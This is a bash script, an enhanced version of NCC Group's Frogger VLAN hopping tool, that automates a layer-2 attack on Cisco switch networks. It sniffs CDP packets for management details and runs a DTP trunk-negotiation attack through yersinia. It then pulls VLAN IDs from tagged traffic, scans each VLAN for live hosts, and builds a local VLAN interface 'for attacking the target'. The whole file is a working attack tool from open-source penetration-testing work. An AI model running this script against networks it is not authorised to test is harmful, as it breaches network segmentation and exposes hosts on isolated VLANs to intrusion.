#!/bin/bash


# Mostly based and inspired by Frogger from nccgroup with copyright below.
# This one has added features like script arguments and use of NetworkManager
# for handling interfaces. It has been tested on Kali Linux 2020.4 but can
# theorically work on any linux system with NetworkManager and getopt installed.

# Frogger - The VLAN Hopper script
# Daniel Compton
# www.commonexploits.com
# contact@commexploits.com
# Twitter = @commonexploits
# 28/11/2012
# Requires arp-scan >= 1.8 for VLAN tagging, yersinia, tshark, vconfig and screen
# Tested on Bactrack 5 and Kali with Cisco devices - it can be used over SSH
# 1.4 changes - Speed improvements on CDP scanning made by Bernardo Damele.
# 1.9 changes - added signal handling made by e williams.

#####################################################################################
# Released as open source by NCC Group Plc - http://www.nccgroup.com/

# Developed by Daniel Compton, daniel dot compton at nccgroup dot com

# https://github.com/nccgroup/vlan-hopping

# https://github.com/nccgroup/vlan-hopping/wiki

# Released under AGPL see LICENSE for more information

######################################################################################

# Default User configuration Settings

SCRIPT=$(basename "$0")
TAGSEC="90" # use option -t or --tagsec to change this value for the number of seconds to sniff for 802.1Q tagged packets
CDPSEC="90" # use option -c or --cdpsec change this value for the number of seconds to sniff for CDP packets once verified CDP is on
DTPWAIT="20" # use option -d or --dtpwait to change the amount of time to wait for DTP attack via yersinia to trigger
NICCHECK="on" # use option -n or --noniccheck if you are confident your built in NIC will work within VMware to set it off. i.e you have made reg change for Intel card.
INT=""

trap exit_gracefully SIGINT

usage() {
cat << EOF
Usage: $SCRIPT
    -h, --help
        Shows this help.

    -i, --interface string
        Network interface to use. If none is specified, will be asked interactively.

    -t, --tagsec int
        The number of seconds to sniff for 802.1Q tagged packets. Default is $TAGSEC.

    -c, --cdpsec int
        The number of seconds to sniff for CDP packets once verified CDP is on. Default is $CDPSEC.

    -d, --dtpwait int
        The number of seconds to wait for DTP attack via yersinia to trigger. Default is $DTPWAIT.

    -n, --noniccheck
        Use it if you are confident your built in NIC will work within VMware i.e you have made reg change for Intel card.
EOF
exit 1
}

# simple signal handler
exit_gracefully() {
  echo -en "\n*** ctrl-c - Exiting ***\n"
  exit $?
}



ARGS=$(getopt -n kfrogger -o hi:t:c:d:n -l help,interface:,tagsec:,cdpsec:,dtpwait:,noniccheck -- "$@")
if [[ $? -ne 0 ]]; then
    usage
fi

eval set -- "$ARGS"

while :
do
    case "$1" in
        -h | --help) usage ;;
        -i | --interface) INT="$2"       ; shift 2;;
        -t | --tagsec) TAGSEC="$2"       ; shift 2;;
        -c | --cdpsec) CDPSEC="$2"       ; shift 2;;
        -d | --dtpwait) DTPWAIT="$2"     ; shift 2;;
        -n | --noniccheck) NICCHECK="off"; shift  ;;
        --) shift; break;;
        *) usage;;
    esac
done

# Variables needed throughout execution, do not touch
MANDOM=""
NATID=""
DEVID=""
MANIP=""
CDPON=""

# Script begins
#===============================================================================

VERSION="2.0"

ARPVER=$(arp-scan -V 2>&1 | grep "arp-scan [0-9]" |awk '{print $2}' | cut -d "." -f 1,2)
clear
echo -e "\e[00;34m########################################################\e[00m"
echo "***   EFrogger - The Enhanced frogger Version $VERSION  ***"
echo ""
echo "***   Auto enumerates VLANs and device discovery ***"
echo -e "\e[00;34m########################################################\e[00m"
echo ""
echo "For usage information refer to the Wiki"
echo ""
echo "https://github.com/mlniang/kfrogger"
echo ""
echo -e "Running with options: TAGSEC=$TAGSEC, CDPSEC=$CDPSEC, DTPWAIT=$DTPWAIT, NICCHECK is $NICCHECK"

# Borrowed principle for bash fn from http://stackoverflow.com/a/4024263
version_gte() {
  [ "$1" == "$(echo -e "$1\n$2" | sort -V | tail -n1)" ]
}

# Check if we're root
if [[ $EUID -ne 0 ]]; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m This program must be run as root. Run again with 'sudo'"
    echo ""
    exit 1
fi

# Check required packages
#================================================
missing_package=0

#Check for nmcli
if ! command -v nmcli >/dev/null; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required nmcli program, install network-manager package and try again."
    missing_package=1
fi

#Check for yersinia
if ! command -v yersinia >/dev/null; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required Yersinia program, install it and try again."
    missing_package=1
fi

#Check for tshark
if ! command -v tshark >/dev/null; then
    echo -e "\e[01;31m[!]\e[00m Unable to find the required tshark program, install and try again."
    echo ""
    missing_package=1
else
    #TSHARKVER=$(tshark -v | sed -n 1p | awk '{print $2}') # In version 2020.4 of Kali this line will return '(Wireshark)''
    TSHARKVER=`tshark -v | head -n1 | grep -o "[0-9.]*" | head -n1`
    if version_gte $TSHARKVER 1.10.6; then # Couldn't actually find correct version to start this behaviour from, but this is a relatively current version
        TS_FILTER_FLAG="-Y"
    else
        TS_FILTER_FLAG="-R"
    fi
fi

#Check for screen
if ! command -v screen >/dev/null; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required screen program, install and try again."
    echo ""
    missing_package=1
fi

#Check for arpscan
if ! command -v arp-scan >/dev/null; then
    echo -e "\e[01;31m[!]\e[00m Unable to find the required arp-scan program, install at least version 1.8 and try again. Download from www.nta-monitor.com."
    echo ""
    missing_package=1
else
	compare_arpscan=$(echo "$ARPVER < 1.8" | bc)
	if [ $compare_arpscan -eq 1 ]; then
        echo ""
        echo -e "\e[01;31m[!]\e[00m Unable to find version 1.8 of arp-scan, 1.8 is required for VLAN tagging. Install at least version 1.8 and try again. Download from www.nta-monitor.com."
        missing_package=1
	fi
fi

#Check for ethtool
if ! command -v ethtool >/dev/null; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m Unable to find the required ethtool program, install and try again."
    echo ""
    missing_package=1
fi

if [[ $missing_package -eq 1 ]]; then
    exit 1
fi

# Check optional package
#================================================
if ! command -v vconfig >/dev/null; then
    echo ""
    echo -e "\e[01;33m[!]\e[00m Warning Unable to find the required vconfig program. The script will work but not be able to create you the virtual interface."
    echo ""
    echo "Press enter to continue or quit and run "apt install vlan" and try again"
    read ENTERKEY
fi

# List connected interfaces
if [[ -z "$INT" ]]; then
    echo ""
    echo -e "\e[01;32m[-]\e[00m The following Interfaces are connected"
    echo ""
    nmcli device status | grep -w connected | awk '{print $1}'
    echo ""

    # Choose interface
    echo -e "\e[1;31m----------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m Enter the interface to scan from as the source"
    echo -e "\e[1;31m----------------------------------------------------------\e[00m"
    read INT
fi

if [[ "$INT" == "lo" ]]; then
    echo ""
    echo ":( LOOPBACK INTERFACE... SERIOUSLY!!!! JOKE'S ON YOU"
    exit 1
fi
state_code=`nmcli -f GENERAL.STATE device show "$INT" 2>/dev/null | awk '{print $2}'`
if [[ $state_code -ne 100 ]]; then
    echo ""
    echo -e "\e[01;31m[!]\e[00m Sorry the specified interface does not exist or is not connected! - check and try again."
    echo ""
    exit 1
fi

# check for Vmware and non USB ethernet card.
if [[ "$NICCHECK" == "on" ]]; then
    dmidecode | grep -i "vmware" >/dev/null
    if [[ $? -eq 0 ]]; then
        if [[ "$INT" == "eth0" ]]; then
            echo ""
            echo -e "\e[01;33m[!]\e[00m Warning it seems you are running within VMware using the built in network interface "$INT". "
            echo ""
            echo "Some built in network cards do not work properly within VMware and VLAN hopping may fail. Ideally use a USB ethernet card, or boot natively into Linux."
            echo ""
            echo -e "Script will continue, but see https://github.com/nccgroup/vlan-hopping/wiki for more info relating to VMware and VLAN Hopping"
            echo ""
            sleep 3
            NICDRV=$(ethtool -i $INT | grep -i "driver" | cut -d ":" -f 2 | sed 's/^[ \t]*//;s/[ \t]*$//')
            modinfo "$NICDRV" |grep -i "intel" >/dev/null
            if [[ $? -eq 0 ]]; then
                echo ""
                echo -e "\e[01;31m[!]\e[00m Warning it also seems that "$INT" is using Intel drivers."
                echo ""
                echo "It is likely the VLAN hopping with fail with Intel Windows drivers and VMware unless the '"MonitorMode"' registry change has been made."
                echo ""
                echo "see https://github.com/nccgroup/vlan-hopping/wiki for how to apply the Intel fix."
                echo ""
                echo "If you have already made the reg change, then pass the option -n or --noniccheck to prevent the check running again"
                echo ""
                echo "Press Enter to continue if you have made the registry change, or CTRL-C to quit."
                echo ""
                read ENTERKEY
            fi
        fi
    fi
fi

# Sniffing CDP Packets
echo ""
echo -e "\e[01;32m[-]\e[00m Now Sniffing CDP Packets on $INT - Please wait for "$CDPSEC" seconds."
echo ""
OUTPUT="`tshark -a duration:$CDPSEC -i $INT $TS_FILTER_FLAG \"cdp\" -V 2>&1 | sort --unique`"
printf -- "${OUTPUT}\n" | while read line
do
	case "${line}" in
        *captured*)
            if [[ -n "$CDPON" ]]; then
                continue
            fi
            CDPON="`printf -- \"${line}\n\" | grep "0 packets"`"
            if [[ "$CDPON" == "0 packets captured" ]]; then
                echo -e "\e[01;31m[!]\e[00m No CDP Packets were found, perhaps CDP is not enabled on the network. Try increasing the CDP time and try again"
                echo ""
                echo $CDPON >CDPONTMP
            fi
            ;;
        VTP\ Management\ Domain:*)
            if [[ -n "$MANDOM" ]]; then 
                continue
            fi
            MANDOM="`printf -- \"${line}\n\" | cut -f2 -d\":\" |sed 's/^[ \t]*//;s/[ \t]*$//'`"
            if [[ "$MANDOM" == "Domain:" ]]; then
                echo -e "\e[01;33m[!]\e[00m The VTP domain appears to be set to NULL on the device. Script will continue."
                echo ""
            elif [[ -z "$MANDOM" ]]; then
                echo -e "\e[01;33m[!]\e[00m I didn't find any VTP management domain within CDP packets. Possibly CDP is not enabled. Script will continue."
                echo ""
            else
                echo -e "\e[1;32m----------------------------------------------------------\e[00m"
                echo -e "\e[01;32m[+]\e[00m The following Management domains were found"
                echo -e "\e[1;32m----------------------------------------------------------\e[00m"
                echo -e "\e[00;32m$MANDOM\e[00m"
                echo ""
            fi
            ;;
        Native\ VLAN:*)
            if [[ -n "$NATID" ]]; then
                continue
            fi
            NATID="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
            if [[ -z "$NATID" ]]; then
                echo -e "\e[01;33m[!]\e[00m I didn't find any Native VLAN ID within CDP packets. Perhaps CDP is not enabled."
                echo ""
            else
                echo -e "\e[1;32m------------------------------------------------\e[00m"
                echo -e "\e[01;32m[+]\e[00m The following Native VLAN ID was found"
                echo -e "\e[1;32m------------------------------------------------\e[00m"
                echo -e "\e[00;32m$NATID\e[00m"
                echo ""
            fi
            ;;
        *RELEASE\ SOFTWARE*)
            if [[ -n "$DEVID" ]]; then
                continue
            fi
            DEVID="`printf -- \"${line}\n\" | awk '{sub(/^[ \t]+/, ""); print}'`"
            if [[ -z "$DEVID" ]]; then
                echo -e "\e[01;33m[!]\e[00m I didn't find any devices. Perhaps it is not a Cisco device."
                echo ""
            else
                echo -e "\e[1;32m-----------------------------------------------------------------------------------------------------------\e[00m"
                echo -e "\e[01;32m[+]\e[00m The following Cisco device was found"
                echo -e "\e[1;32m-----------------------------------------------------------------------------------------------------------\e[00m"
                echo -e "\e[00;32m$DEVID\e[00m"
                echo ""
            fi
            ;;
        IP\ address:*)
            if [[ -n "$MANIP" ]]; then
                continue
            fi
            MANIP="`printf -- \"${line}\n\" | cut -f2 -d\":\" | sed 's/^[ \t]*//;s/[ \t]*$//'`"
            if [[ -z "$MANIP" ]]; then
                echo -e "\e[01;31m[!]\e[00m I didn't find any management addresses within CDP packets. Try increasing the CDP time and try again."
                exit 1
            else
                echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
                echo -e "\e[01;32m[+]\e[00m The following Management IP Addresses were found"
                echo -e "\e[1;32m-----------------------------------------------------------\e[00m"
                echo -e "\e[00;32m$MANIP\e[00m"
                echo $MANIP >MANIPTMP
                echo ""
            fi
            ;;
	esac
done

# if CDP was not found, then exit script
cat CDPONTMP 2>&1 | grep "0 packets captured" >/dev/null
if [[ $? -eq 0 ]]; then
    rm CDPONTMP 2>/dev/null
    exit 1
else
    rm CDPONTMP 2>/dev/null
fi

echo ""
echo -e "\e[01;32m[-]\e[00m Now Running DTP Attack on interface $INT, waiting "$DTPWAIT" seconds to trigger."
echo ""
screen -d -m -S yersina_dtp yersinia dtp -attack 1 -interface $INT
sleep $DTPWAIT

echo ""
echo -e "\e[01;32m[-]\e[00m Now Extracting VLAN IDs on interface $INT, sniffing 802.1Q tagged packets for "$TAGSEC" seconds."
echo ""

VLANIDS=`tshark -a duration:$TAGSEC -i $INT $TS_FILTER_FLAG "vlan" -x -V 2>&1 | grep -o " = ID: .*" | awk '{ print $NF }' | sort --unique`

if [[ -z "$VLANIDS" ]]; then
    echo -e "\e[01;31m[!]\e[00m I didn't find any VLAN IDs within 802.1Q tagged packets. Try increasing the tagged time (TAGSEC) and try again."
    echo ""
    exit 1
else
    echo -e "\e[01;32m[+]\e[00m The following VLAN IDs were found"
    echo ""
    echo -e "\e[1;32m------------------------------------\e[00m"
    echo -e "\e[00;32m$VLANIDS\e[00m"
    echo -e "\e[1;32m------------------------------------\e[00m"
    echo ""
fi

SCANSDTP=$(cat MANIPTMP |cut -d "." -f 1,2,3)

echo -e "\e[1;31m------------------------------------------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Enter the IP address or CIDR range you wish to scan for live devices in i.e 192.168.1.1 or 192.168.1.0/24"
echo ""
echo "Looking at the management address, try to scan "$SCANSDTP".0/24"
echo -e "\e[1;31m------------------------------------------------------------------------------------------------------------------------\e[00m"
read IPADDRESS

rm MANIPTMP 2>/dev/null
clear
for VLANIDSCAN in $(echo "$VLANIDS"); do
	echo ""
	echo -e "\e[1;33m---------------------------------------------------------------------------------------\e[00m"
	echo -e "\e[01;32m[-]\e[00m Now scanning \e[00;32m$IPADDRESS - VLAN $VLANIDSCAN\e[00m for live devices"
	echo -e "\e[1;33m---------------------------------------------------------------------------------------\e[00m"
	echo ""
	arp-scan -Q $VLANIDSCAN -I $INT $IPADDRESS -t 500 2>&1 | grep "802.1Q VLAN="
	if [[ $? -eq 0 ]]; then
        echo ""
        echo -e "\e[01;32m[+] Devices were found in VLAN "$VLANIDSCAN"\e[00m"
    else
        echo -e "\e[01;31m[!]\e[00m No devices found in VLAN "$VLANIDSCAN"."
	fi
done

#Menu choice for creating VLAN interface
echo ""
echo -e "\e[1;31m-----------------------------------------------------------------------------------------\e[00m"
echo -e "\e[01;31m[?]\e[00m Do you want to create a new interface in the discoved VLAN or Exit?"
echo -e "\e[1;31m-----------------------------------------------------------------------------------------\e[00m"
echo ""
echo " 1. Create a new local VLAN Interface for attacking the target"
echo ""
echo " 2. Exit script - this will kill all processes and stop the DTP attack"
echo ""
echo -e "\e[1;31m------------------------------------------------------------------------------------------\e[00m"
echo ""
read EXITMENU

if [[ "$EXITMENU" == "1" ]]; then
    echo -e "\e[1;31m-----------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m Enter the VLAN ID to Create i.e 100"
    echo -e "\e[1;31m-----------------------------------------------\e[00m"
    read VID
    echo ""
    echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------\e[00m"
    echo -e "\e[01;31m[?]\e[00m Enter the IP address you wish to assign to the new VLAN interface $VID i.e 192.168.1.100/24"
    echo -e "\e[1;31m-------------------------------------------------------------------------------------------------------------\e[00m"
    read VIP
    modprobe 8021q
    vconfig add $INT $VID
    ifconfig $INT.$VID up
    ifconfig $INT.$VID $VIP
    echo ""
    echo -e "\e[01;32m[+]\e[00m The following interface is now configured locally"
    echo ""
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo -e "\e[01;32m[+]\e[00m Interface \e[1;32m$INT.$VID\e[00m with IP Address \e[1;32m$VIP\e[00m"
    echo -e "\e[01;32m+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\e[00m"
    echo ""

elif [[ "$EXITMENU" == "2" ]]; then
    ps -ef | grep "[Yy]ersinia dtp" >/dev/null
    if [[ $? -eq 0 ]]; then
        killall yersinia
        echo ""
        echo -e "\e[01;32m[+]\e[00m DTP attack has been stopped."
        echo ""
        exit 1
    else
        echo ""
        exit 1
    fi
fi
#END